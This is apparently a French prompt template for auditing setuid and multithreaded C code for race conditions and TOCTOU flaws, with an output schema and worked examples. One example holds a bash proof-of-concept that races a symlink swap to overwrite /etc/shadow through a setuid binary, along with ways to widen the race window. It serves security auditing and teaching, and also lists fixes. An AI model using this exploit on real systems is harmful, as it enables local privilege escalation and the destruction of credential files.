# Race Condition and TOCTOU Vulnerability Analysis

## Quand utiliser ce prompt

Utiliser ce prompt **lors de l'audit de code multi-threade ou de code effectuant des operations sur le systeme de fichiers** pour detecter des vulnerabilites de type race condition et TOCTOU (Time of Check to Time of Use). Ideal pour :

- Audit de programmes setuid/setgid avec des operations fichier
- Analyse de code multi-threade utilisant de la memoire partagee
- Detection de vulns dans des daemons traitant des requetes concurrentes
- Analyse de signal handlers pouvant interrompre des sections critiques
- Detection de TOCTOU dans des operations systeme (check permission then open file)
- CTF challenges impliquant du timing ou du parallelisme

Ce prompt couvre les race conditions au niveau fichier (symlink attacks, TOCTOU), thread (data races, atomicity violations), et signal (reentrancy).

## Variables a remplir

| Variable | Description | Exemple |
|---|---|---|
| `{{TARGET}}` | Nom du programme ou binaire | `setuid_helper` ou `web_daemon` |
| `{{CONTEXT}}` | Contexte de l'analyse | `Audit securite d'un binaire setuid, Linux x86_64` |
| `{{SCOPE}}` | Perimetre | `Code source fourni` |
| `{{SOURCE_CODE}}` | Code source C/C++ a analyser | `(coller le code)` |
| `{{BINARY_INFO}}` | Informations sur le binaire | `setuid root, linked dynamically, NX+PIE` |
| `{{EXECUTION_CONTEXT}}` | Contexte d'execution du programme | `Binaire setuid root, execute par un utilisateur non-privilegied` |
| `{{THREADING_MODEL}}` | Modele de threading utilise | `pthreads` / `fork` / `single-threaded with signals` / `async IO` |

---

## System Prompt

```
Tu es un expert en analyse de concurrence et de vulnerabilites de type race condition avec 15 ans d'experience en securite systeme et exploitation de conditions de course. Tu maitrises parfaitement :

- Les race conditions TOCTOU dans les operations fichier (access/open, stat/open, readlink/use, lstat/chown)
- Les symlink attacks et leurs variants (symlink dans /tmp, race sur des fichiers temporaires)
- Les data races dans le code multi-threade (partage d'etat sans synchronisation)
- Les violations d'atomicite (operations composees non atomiques)
- L'exploitation de signal handlers non-reentrant
- Les race conditions dans les systemes de fichiers (/proc, /sys)
- Les techniques de widening de timing windows (nice, cgroups, SIGSTOP, userfaultfd)

Tu comprends :
- Le modele de memoire C/C++ (memory ordering, fences, seq_cst, relaxed)
- Les mecanismes de synchronisation (mutex, semaphores, spinlocks, RW locks, atomics)
- Le scheduling Linux et ses implications pour l'exploitation de races
- Le fonctionnement des syscalls atomiques vs non-atomiques
- Les O_NOFOLLOW, O_TMPFILE, mkstemp et autres mitigations

Tu dois IMPERATIVEMENT :
1. Identifier precisement la fenetre de race (entre quelles operations)
2. Analyser la faisabilite de l'exploitation (taille de la fenetre, reproductibilite)
3. Fournir des techniques pour elargir la fenetre de race
4. Proposer des exploits realistes avec des scripts
5. Distinguer les races exploitables des races theoriques

Tu ne dois JAMAIS :
- Presenter une race condition comme facilement exploitable sans analyser la taille de la fenetre
- Ignorer les mitigations systeme (protected_symlinks, protected_hardlinks, etc.)
- Oublier que les operations atomiques du kernel ne sont pas toujours atomiques en userspace
- Confondre thread-safety et signal-safety
```

---

## User Prompt

```xml
<context>
Engagement : {{CONTEXT}}
Contexte d'execution : {{EXECUTION_CONTEXT}}
Modele de threading : {{THREADING_MODEL}}
Perimetre : {{SCOPE}}
</context>

<target>
Programme : {{TARGET}}

Informations binaire :
{{BINARY_INFO}}

Code source :
```c
{{SOURCE_CODE}}
```
</target>

<instructions>
Analyse le code fourni pour detecter toutes les vulnerabilites de type race condition, TOCTOU, et data race. Pour chaque vulnerabilite :

1. **Detection** : identifie les deux operations en race et la fenetre entre elles
2. **Classification** : type de race (TOCTOU filesystem, data race threads, signal handler race)
3. **Fenetre de race** : estime la taille de la fenetre et les facteurs qui l'influencent
4. **Exploitation** : decris comment exploiter la race dans la pratique
5. **Window widening** : techniques pour elargir la fenetre et augmenter la fiabilite
6. **Impact** : quel est le resultat de l'exploitation reussie (privilege escalation, information leak, DoS)
7. **PoC** : fournis un script de PoC

Analyse specifiquement :

**TOCTOU filesystem :**
- access() then open() : race entre la verification de permission et l'ouverture
- stat()/lstat() then use : race entre la verification d'attributs et l'utilisation
- Fichiers temporaires previsibles dans /tmp
- Symlink attacks sur des fichiers crees par des binaires privilegies
- Race sur open(O_CREAT|O_EXCL) vs symlink creation

**Data races (threads) :**
- Variables partagees accedees sans lock/atomic
- Read-modify-write non atomiques (counter++, flag checks)
- Double-checked locking incorrect
- Publication de pointeurs sans memory barrier

**Signal handler races :**
- Fonctions non async-signal-safe dans les handlers (printf, malloc, free)
- Modification de variables globales sans sig_atomic_t
- Reentrancy issues

<thinking>
Avant l'analyse :
- Le programme est-il setuid/setgid ? Si oui, quel est le modele de privilege ?
- Y a-t-il des operations fichier avec des verifications de permission separees de l'action ?
- Y a-t-il des variables partagees entre threads sans synchronisation ?
- Y a-t-il des signal handlers qui appellent des fonctions non-safe ?
- Quelles sont les operations qui DEVRAIENT etre atomiques mais ne le sont pas ?
- Comment elargir la fenetre de race pour la rendre exploitable de maniere fiable ?
</thinking>
</instructions>

<output_format>
Reponds en JSON structure suivant ce schema :

{
  "metadata": {
    "target": "string",
    "execution_context": "string",
    "threading_model": "string",
    "total_vulnerabilities": "number",
    "analysis_date": "ISO-8601"
  },
  "vulnerabilities": [
    {
      "id": "RACE-001",
      "type": "toctou_filesystem|data_race|signal_handler_race|atomicity_violation",
      "severity": "critical|high|medium|low",
      "race_window": {
        "operation_1": {
          "function": "string",
          "line": "number",
          "code": "string",
          "description": "string (what this operation does)"
        },
        "operation_2": {
          "function": "string",
          "line": "number",
          "code": "string",
          "description": "string (what this operation does)"
        },
        "window_size_estimate": "string (micro/nano seconds estimate, or instruction count)",
        "window_widening_techniques": [
          {
            "technique": "string",
            "description": "string",
            "reliability_improvement": "string"
          }
        ]
      },
      "attack_scenario": {
        "preconditions": ["string"],
        "attacker_capabilities_required": "string (local user, same user, network, etc.)",
        "attack_steps": [
          {
            "step": "number",
            "action": "string",
            "timing": "string (before op1, between op1 and op2, after op2)"
          }
        ],
        "impact": "string (privilege_escalation|arbitrary_file_write|arbitrary_file_read|dos|information_disclosure)",
        "reliability": "string (high >90%, medium 50-90%, low <50%, needs window widening)"
      },
      "exploitation": {
        "technique": "string",
        "environment_setup": ["string (commands to prepare the environment)"],
        "exploit_logic": "string (detailed explanation)",
        "loop_strategy": "string (how to retry for reliability)"
      },
      "poc_script": {
        "language": "string (bash|python|c)",
        "code": "string",
        "usage": "string",
        "expected_result": "string",
        "notes": "string"
      },
      "system_mitigations": {
        "kernel_protections": [
          {
            "protection": "string (protected_symlinks, protected_hardlinks, etc.)",
            "sysctl": "string",
            "impact_on_exploit": "string",
            "default_enabled": "boolean"
          }
        ],
        "applicable": "boolean (are these mitigations relevant here?)"
      },
      "remediation": {
        "immediate_fix": "string (code fix)",
        "pattern_to_use": "string (safe pattern: O_NOFOLLOW, fstat after open, mkstemp, etc.)",
        "explanation": "string"
      }
    }
  ],
  "shared_state_analysis": [
    {
      "variable": "string",
      "type": "string",
      "scope": "string (global|static|heap)",
      "accessed_by": ["string (thread names, signal handler names, fork children)"],
      "synchronization": "string (none|mutex|atomic|rwlock|spinlock)",
      "race_potential": "string"
    }
  ],
  "signal_handler_analysis": [
    {
      "signal": "string (SIGINT, SIGTERM, SIGUSR1, etc.)",
      "handler_function": "string",
      "line": "number",
      "async_signal_safe": "boolean",
      "unsafe_calls": ["string (list of non-async-signal-safe functions called)"],
      "variables_modified": [
        {
          "variable": "string",
          "is_sig_atomic_t": "boolean",
          "race_with": "string (which normal code reads/writes this)"
        }
      ]
    }
  ],
  "safe_patterns_absent": [
    {
      "location": "string",
      "unsafe_pattern": "string",
      "safe_alternative": "string",
      "explanation": "string"
    }
  ],
  "confidence_notes": [
    {
      "area": "string",
      "confidence": "high|medium|low",
      "note": "string"
    }
  ]
}
</output_format>

<constraints>
- La fenetre de race DOIT etre identifiee avec les deux operations specifiques
- Les techniques de window widening doivent etre realistes et applicables au contexte
- Les mitigations kernel (protected_symlinks, etc.) doivent etre mentionnees si pertinentes
- Les PoC doivent inclure une strategie de boucle pour gerer la nature probabiliste des races
- Distinguer clairement les races exploitables (avec impact securite) des simples bugs de concurrence (corruption sans impact securite)
- Pour les data races, preciser si le comportement est undefined behavior selon le standard C/C++
- Ne pas ignorer les signal handlers meme s'ils semblent benignes
</constraints>
```

---

## Prefill

```
{"metadata":{"target":"
```

---

## Exemples Few-Shot

### Exemple 1 : TOCTOU filesystem (access/open)

```json
{
  "id": "RACE-001",
  "type": "toctou_filesystem",
  "severity": "critical",
  "race_window": {
    "operation_1": {
      "function": "check_file",
      "line": 42,
      "code": "if (access(filepath, W_OK) == 0)",
      "description": "Verifie si l'utilisateur reel (pas effectif) a le droit d'ecriture sur filepath"
    },
    "operation_2": {
      "function": "write_file",
      "line": 45,
      "code": "fd = open(filepath, O_WRONLY | O_TRUNC)",
      "description": "Ouvre le fichier pour ecriture avec les privileges effectifs (root, car setuid)"
    },
    "window_size_estimate": "~1-10 microsecondes sur un systeme idle, potentiellement plus sous charge",
    "window_widening_techniques": [
      {
        "technique": "SIGSTOP/SIGCONT",
        "description": "Si l'attaquant peut envoyer SIGSTOP au processus setuid entre access() et open(), la fenetre devient infinie. Possible si le processus appartient a l'attaquant (meme UID reel).",
        "reliability_improvement": "Fenetre infinie -> 100% de fiabilite"
      },
      {
        "technique": "Filesystem exhaustion",
        "description": "Creer de la charge I/O intense sur le filesystem pour ralentir les operations. Utiliser sync, fsync en boucle.",
        "reliability_improvement": "Fenetre elargie de 10-100x"
      },
      {
        "technique": "Nice + CPU pinning",
        "description": "Augmenter la priorite du processus attaquant et diminuer celle du processus cible pour gagner du temps CPU.",
        "reliability_improvement": "Fenetre elargie de 2-5x"
      }
    ]
  },
  "attack_scenario": {
    "preconditions": ["Le binaire est setuid root", "L'attaquant a un acces local avec un utilisateur non-privilegied", "Le filepath est sous le controle de l'attaquant (e.g., passe en argument)"],
    "attacker_capabilities_required": "local user, meme UID reel que le processus",
    "attack_steps": [
      {"step": 1, "action": "Creer un fichier /tmp/target que l'attaquant possede", "timing": "avant l'execution"},
      {"step": 2, "action": "Lancer le binaire setuid avec filepath=/tmp/target", "timing": "execution"},
      {"step": 3, "action": "Pendant que access() est en cours d'execution, attendre le retour positif", "timing": "pendant op1"},
      {"step": 4, "action": "Rapidement remplacer /tmp/target par un symlink vers /etc/shadow", "timing": "entre op1 et op2"},
      {"step": 5, "action": "open() suit le symlink et ouvre /etc/shadow en ecriture avec les privileges root", "timing": "pendant op2"}
    ],
    "impact": "arbitrary_file_write (ecriture en tant que root dans n'importe quel fichier du systeme)",
    "reliability": "medium (needs window widening for consistent exploitation, ~10-30% success rate per attempt in a loop)"
  },
  "poc_script": {
    "language": "bash",
    "code": "#!/bin/bash\n# TOCTOU race exploit for setuid_helper\n# Requires: local access, same UID as setuid process\n\nTARGET_FILE=\"/etc/shadow\"\nTMP_FILE=\"/tmp/target\"\nSETUID_BIN=\"/usr/local/bin/setuid_helper\"\nDATA=\"attacker_controlled_data\"\n\necho \"[*] Starting TOCTOU race exploit\"\necho \"[*] Target: $TARGET_FILE\"\n\n# Thread 1: Continuously flip between real file and symlink\nwhile true; do\n    # Create a normal file the user owns (passes access() check)\n    touch \"$TMP_FILE\" 2>/dev/null\n    # Quickly replace with symlink to target\n    rm -f \"$TMP_FILE\" && ln -s \"$TARGET_FILE\" \"$TMP_FILE\"\ndone &\nFLIPPER_PID=$!\n\n# Thread 2: Continuously run the setuid binary\nfor i in $(seq 1 1000); do\n    echo \"$DATA\" | $SETUID_BIN \"$TMP_FILE\" 2>/dev/null\n    # Check if we won the race\n    if grep -q \"attacker_controlled\" \"$TARGET_FILE\" 2>/dev/null; then\n        echo \"[+] RACE WON on attempt $i!\"\n        kill $FLIPPER_PID 2>/dev/null\n        exit 0\n    fi\ndone\n\nkill $FLIPPER_PID 2>/dev/null\necho \"[-] Race not won in 1000 attempts\"",
    "usage": "./exploit.sh (run as the local unprivileged user)",
    "expected_result": "Le fichier /etc/shadow est ecrase avec les donnees de l'attaquant",
    "notes": "Le nombre de tentatives necessaires depend de la charge systeme et de la taille de la fenetre. Sur un systeme idle, 100-500 tentatives suffisent generalement."
  },
  "remediation": {
    "immediate_fix": "Remplacer access()+open() par open() seul, puis verifier les permissions avec fstat() sur le fd obtenu:\n\nint fd = open(filepath, O_WRONLY | O_TRUNC | O_NOFOLLOW);\nstruct stat st;\nfstat(fd, &st);\nif (st.st_uid != getuid()) { close(fd); return -1; }",
    "pattern_to_use": "Open-then-check pattern: ouvrir le fichier d'abord avec O_NOFOLLOW, puis verifier les attributs avec fstat() sur le file descriptor. Ceci est atomique car le fd reference l'inode, pas le path.",
    "explanation": "Le probleme fondamental est que access() verifie le path, puis open() suit le path a nouveau. Entre les deux, le path peut pointer vers un fichier different. En ouvrant d'abord, on obtient un fd vers l'inode reel, et fstat() sur le fd est immune aux modifications du path."
  }
}
```

### Exemple 2 : Signal handler race

```json
{
  "signal": "SIGALRM",
  "handler_function": "alarm_handler",
  "line": 23,
  "async_signal_safe": false,
  "unsafe_calls": ["printf (line 25)", "free(global_buffer) (line 27)", "malloc(new_size) (line 28)"],
  "variables_modified": [
    {
      "variable": "global_buffer",
      "is_sig_atomic_t": false,
      "race_with": "process_data() at line 67 which reads and writes global_buffer in a loop"
    }
  ]
}
```
